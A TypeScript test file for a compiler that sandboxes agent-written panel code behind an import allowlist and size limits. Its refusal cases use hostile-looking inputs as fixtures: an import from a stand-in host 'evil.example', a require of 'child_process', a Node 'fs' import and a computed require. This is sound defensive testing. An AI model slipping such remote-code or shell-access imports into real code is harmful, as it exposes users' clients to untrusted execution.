/**
 * The stored-panel compiler (convex/panels/compiler.ts): pure, no backend. It is the only gate between TSX an
 * agent writes and code every client of that player evaluates, so the allowlist and the limits are checked here.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { ConvexError } from "convex/values";
import { compilePanel, PANEL_IMPORTS } from "../../convex/panels/compiler.ts";
import { LIMITS } from "../../convex/panels/limits.ts";

const PANEL = `import { useMemo } from "react";
import { definePanel, useObjects } from "@sdk";
export default definePanel({
  title: "Count",
  placement: "left",
  size: "sm",
  Component() {
    const objects = useObjects({ hz: 1 });
    const n = useMemo(() => objects.length, [objects]);
    return <p data-testid="count">{n}</p>;
  },
});
`;

const ok = (result: ReturnType<typeof compilePanel>) => {
  if (!result.ok) assert.fail(`expected success, got ${JSON.stringify(result.diagnostics)}`);
  return result;
};

/** Runs compiled CommonJS with a fake require, the way the panel frame's loader does. */
function evaluate(compiled: string, modules: Record<string, unknown>) {
  const module = { exports: {} as Record<string, unknown> };
  const required: string[] = [];
  new Function("exports", "require", "module", compiled)(module.exports, (name: string) => { required.push(name); return modules[name]; }, module);
  return { exports: module.exports, required };
}

test("a panel compiles to CommonJS that requires @sdk, react and react/jsx-runtime (react-jsx, no React global)", () => {
  const result = ok(compilePanel(PANEL));
  assert.match(result.compiled, /require\("@sdk"\)/);
  assert.match(result.compiled, /require\("react\/jsx-runtime"\)/);
  assert.doesNotMatch(result.compiled, /React\.createElement/);
  const jsx = (type: unknown, props: unknown) => ({ type, props });
  const { exports, required } = evaluate(result.compiled, {
    react: { useMemo: (f: () => unknown) => f() }, "react/jsx-runtime": { jsx, jsxs: jsx },
    "@sdk": { definePanel: (d: unknown) => d, useObjects: () => [1, 2, 3] },
  });
  assert.deepEqual(required.sort(), ["@sdk", "react", "react/jsx-runtime"]);
  const definition = exports.default as { title: string; Component: () => { props: { children: unknown } } };
  assert.equal(definition.title, "Count");
  assert.equal(definition.Component().props.children, 3);
  assert.deepEqual(result.manifest, { title: "Count", placement: "left", size: "sm" });
  assert.match(result.sourceHash, /^[0-9a-f]{64}$/);
  assert.match(result.compilerVersion, /typescript/);
});

test("a syntax error reports its line and column and produces no code", () => {
  // Line 3 is `  return <p>{1 + }</p>;`: the expression is missing where `}` stands, column 18.
  const result = compilePanel(`import { definePanel } from "@sdk";\nexport default definePanel({ title: "x", Component() {\n  return <p>{1 + }</p>;\n} });\n`);
  assert.equal(result.ok, false);
  assert.ok(!("compiled" in result) || result.compiled === undefined);
  const first = result.diagnostics[0];
  assert.equal(first.line, 3);
  assert.equal(first.column, 18);
  assert.match(first.code, /^TS\d+$/);
  assert.ok(first.message.length > 0);
});

for (const [label, source, needle] of [
  ["a Node module", `import fs from "fs";\nexport default 1;\n`, `"fs"`],
  ["a URL import", `import x from "https://evil.example/x.js";\nexport default x;\n`, `"https://evil.example/x.js"`],
  ["a relative import", `export { a } from "./other";\n`, `"./other"`],
  ["require of a module outside the list", `const cp = require("child_process");\nexport default cp;\n`, `"child_process"`],
] as const) {
  test(`${label} is refused, naming the allowlist`, () => {
    const result = compilePanel(source);
    assert.equal(result.ok, false);
    const d = result.diagnostics.find(x => x.code === "CG_IMPORT");
    assert.ok(d, JSON.stringify(result.diagnostics));
    assert.ok(d.message.includes(needle), d.message);
    for (const allowed of PANEL_IMPORTS) assert.ok(d.message.includes(allowed), `names ${allowed}: ${d.message}`);
    assert.equal(d.line, 1);
  });
}

test("dynamic import() and a non-literal require are refused", () => {
  const dynamic = compilePanel(`import { definePanel } from "@sdk";\nconst m = import("@sdk");\nexport default definePanel({ title: "x", Component: () => null });\n`);
  assert.equal(dynamic.ok, false);
  const d = dynamic.diagnostics.find(x => x.code === "CG_DYNAMIC_IMPORT");
  assert.ok(d, JSON.stringify(dynamic.diagnostics));
  assert.equal(d.line, 2);
  assert.equal(d.column, 11);
  for (const allowed of PANEL_IMPORTS) assert.ok(d.message.includes(allowed));

  const computed = compilePanel(`const name = "f" + "s";\nconst m = require(name);\nexport default m;\n`);
  assert.equal(computed.ok, false);
  assert.ok(computed.diagnostics.some(x => x.code === "CG_REQUIRE" && x.line === 2), JSON.stringify(computed.diagnostics));
});

test("type-only and react imports are allowed; `import React from \"react\"` still works", () => {
  const result = ok(compilePanel(`import React, { useState } from "react";\nimport type { PanelDefinition } from "@sdk";\nconst d: PanelDefinition = { title: "t", Component: () => { const [n] = useState(2); return <b>{n}</b>; } };\nexport default d;\n`));
  assert.match(result.compiled, /require\("react"\)/);
});

test("source over 64 KB is refused before compiling", () => {
  const big = `export default ${JSON.stringify("x".repeat(LIMITS.sourceBytes))};\n`;
  assert.throws(() => compilePanel(big), (error: unknown) => error instanceof ConvexError && /64 KB/.test((error.data as { message: string }).message));
  // Bytes, not characters: 22 000 three-byte characters are 66 000 bytes.
  assert.throws(() => compilePanel(`// ${"€".repeat(22_000)}\nexport default 1;\n`), ConvexError);
});

test("compiled output over 128 KB is refused", () => {
  // JSX expands: each <i/> (4 characters) compiles to about 30 characters of jsx() calls.
  const source = `import { definePanel } from "@sdk";\nexport default definePanel({ title: "x", Component: () => <div>${"<i/>".repeat(6000)}</div> });\n`;
  assert.ok(Buffer.byteLength(source) <= LIMITS.sourceBytes);
  assert.throws(() => compilePanel(source), (error: unknown) => error instanceof ConvexError && /128 KB/.test((error.data as { message: string }).message));
});

// Golden: every panel the player app ships (src/panels/**/*.tsx, examples included) must also work as a stored panel.
const panelsDir = fileURLToPath(new URL("../../../player-web/src/panels/", import.meta.url));
const walk = (dir: string): string[] => readdirSync(dir).flatMap(name => {
  const path = join(dir, name);
  return statSync(path).isDirectory() ? walk(path) : name.endsWith(".tsx") ? [path] : [];
});
const files = walk(panelsDir);
test("golden: the player app ships example panels to compile", () => assert.ok(files.length >= 7, `${files.length} panels`));
for (const file of files) {
  test(`golden: ${file.slice(panelsDir.length)} compiles as a stored panel`, () => {
    const result = ok(compilePanel(readFileSync(file, "utf8")));
    assert.match(result.compiled, /require\("@sdk"\)/);
    assert.ok(result.manifest.title, "a literal title is read from definePanel");
  });
}
